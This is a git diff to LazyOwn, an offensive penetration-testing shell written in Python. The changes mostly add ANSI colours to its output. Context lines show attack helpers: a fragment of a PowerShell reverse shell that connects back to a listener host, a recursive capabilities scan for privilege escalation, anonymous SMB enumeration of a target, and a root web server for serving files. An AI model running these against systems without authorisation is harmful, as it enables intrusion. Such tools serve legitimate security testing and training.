@@ -51,12 +51,38 @@ BANNER = """
                                                                               
 [*] Iniciando: Framework [;,;]
 """
-print(BANNER)
+
 version = "v0.0.11"
+# Definimos algunos códigos de escape ANSI para colores
+RESET = "\033[0m"
+BOLD = "\033[1m"
+UNDERLINE = "\033[4m"
+
+# Colores de texto
+BLACK = "\033[30m"
+RED = "\033[31m"
+GREEN = "\033[32m"
+YELLOW = "\033[33m"
+BLUE = "\033[34m"
+MAGENTA = "\033[35m"
+CYAN = "\033[36m"
+WHITE = "\033[37m"
+
+# Colores de fondo
+BG_BLACK = "\033[40m"
+BG_RED = "\033[41m"
+BG_GREEN = "\033[42m"
+BG_YELLOW = "\033[43m"
+BG_BLUE = "\033[44m"
+BG_MAGENTA = "\033[45m"
+BG_CYAN = "\033[46m"
+BG_WHITE = "\033[47m"
+
+print(f"{RED}{BANNER}{RESET}")
 
 def signal_handler(sig, frame):
     global should_exit
-    print("\n [<-] para salir usar el comando exit ...")
+    print(f"\n {RED}[<-]{YELLOW} para salir usar el comando{GREEN} exit ...{RESET}")
     should_exit = True
     return
 
@@ -71,12 +97,12 @@ def is_binary_present(binary_name):
 
 class LazyOwnShell(Cmd):
     prompt = "LazyOwn> "
-    intro = f"""\n[*] Welcome to the LazyOwn Framework [;,;] {version} interactive shell! Type ? to list commands
+    intro = f"""{YELLOW}\n[*] Welcome to the LazyOwn Framework [;,;] {version} interactive shell! Type ? to list commands
 [+] Github: https://github.com/grisuno/LazyOwn
 [+] Web: https://grisuno.github.io/LazyOwn/
 [+] Reddit: https://www.reddit.com/r/LazyOwn/
 [+] Facebook: https://web.facebook.com/profile.php?id=61560596232150
-[+] hackTheBox: https://app.hackthebox.com/teams/overview/6429
+[+] hackTheBox: https://app.hackthebox.com/teams/overview/6429 {RESET}
 """
     os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
 
@@ -169,15 +195,15 @@ class LazyOwnShell(Cmd):
         """Set a parameter value. Usage: set <parameter> <value>"""
         args = shlex.split(line)
         if len(args) != 2:
-            print("[?] Usage: set <parameter> <value>")
+            print(f"{YELLOW}[?] Usage: set <parameter> <value>{RESET}")
             return
 
         param, value = args
         if param in self.params:
             self.params[param] = value
-            print(f"[SET] {param} set to {value}")
+            print(f"{GREEN}[SET] {YELLOW}{param} set to {GREEN}{value} {RESET}")
         else:
-            print(f"[?] Unknown parameter: {param}")
+            print(f"{RED}[?] Unknown parameter: {param}{RESET}")
 
     def do_show(self, line):
         """Show the current parameter values"""
@@ -619,7 +645,7 @@ class LazyOwnShell(Cmd):
             for key, value in data.items():
                 if key in self.params:
                     self.params[key] = value
-            print("[*] Parameters loaded from payload.json")
+            print(f"{YELLOW}[*] Parameters loaded from{GREEN} payload.json{RESET}")
         except FileNotFoundError:
             print("[?] payload.json not found")
         except json.JSONDecodeError:
@@ -644,12 +670,13 @@ class LazyOwnShell(Cmd):
 
     def do_getcap(self, line):
         """try get capabilities :)"""
-        print("[+] Try get capabilities")
+        print(f"{YELLOW}[+] Try get capabilities {RESET}")
         os.system("getcap -r / 2>/dev/null")
+        return
 
     def do_getseclist(self, line):
         """get seclist :D"""
-        print("[+] Try to get seclist wordlist [;,;]")
+        print(f"{YELLOW}[+] Try to get seclist wordlist [;,;] {RESET}")
         os.system("""cd /usr/share/wordlists/ && sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
         && sudo unzip SecList.zip \
         && sudo  rm -f SecList.zip""")
@@ -661,10 +688,10 @@ class LazyOwnShell(Cmd):
             return
         rhost = self.params["rhost"]
         if line:
-            print(f"[*] Try .. smbclient -N \\\\{rhost}\\\\{line}")
+            print(f"{YELLOW}[*] Try .. smbclient -N \\\\{rhost}\\\\{line} {RESET}")
             os.system(f"smbclient -N \\\\\\\\{rhost}\\\\{line}")
             return
-        print(f"perform this command: smbclient -N -L \\\\{rhost}\\")
+        print(f"{GREEN}[*] perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
         os.system(f"smbclient -N -L \\\\{rhost}\\")
 
     def do_smbmap(self, line):
@@ -1165,7 +1192,7 @@ $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream =
         """ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }' and copy de ip to clipboard :)"""
         os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
         os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
-        print("[*] ip from tun0 copied to clipboard :)")
+        print(f"{BLUE}[*] ip from tun0 copied to clipboard :) {RESET}")
         return
 
     def do_py3ttyup(self,line):
@@ -1179,8 +1206,9 @@ $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream =
         os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
         os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
         os.system('echo -e "[\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"')
+        print(f"{YELLOW}[*] {GREEN} Web server at sessions in port {RED} 80 {RESET}")
         os.system("cd sessions && sudo python3 -m http.server 80")
-        print("[*] Web server at sessions in port 80")
+        print(f"{RED}[*] {YELLOW} Shutdown Web server at sessions in port {RED} 80 {RESET}")
         return
 
     def do_samrdump(self, line):
